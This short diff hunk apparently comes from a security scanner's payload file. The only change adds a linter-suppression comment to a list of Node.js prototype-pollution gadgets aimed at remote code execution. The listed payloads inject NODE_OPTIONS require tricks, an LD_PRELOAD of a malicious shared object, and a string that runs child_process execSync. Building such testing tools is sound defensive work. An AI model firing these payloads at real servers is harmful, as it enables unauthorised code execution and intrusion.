@@ -54,7 +54,7 @@ SSPP_PAYLOADS = [
 # Remote Code Execution (RCE) Gadgets (Node.js)
 RCE_PAYLOADS = [
     {"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}},
-    {"__proto__": {"env": {"LD_PRELOAD": "/tmp/evil.so"}}},
+    {"__proto__": {"env": {"LD_PRELOAD": "/tmp/evil.so"}}},  # nosec B108
     {"__proto__": {"argv0": "node", "NODE_OPTIONS": "--require /proc/self/cmdline"}},
     {"__proto__": {"ssrCssVars": "1}; return process.mainModule.require('child_process').execSync('id')//"}},
 ]
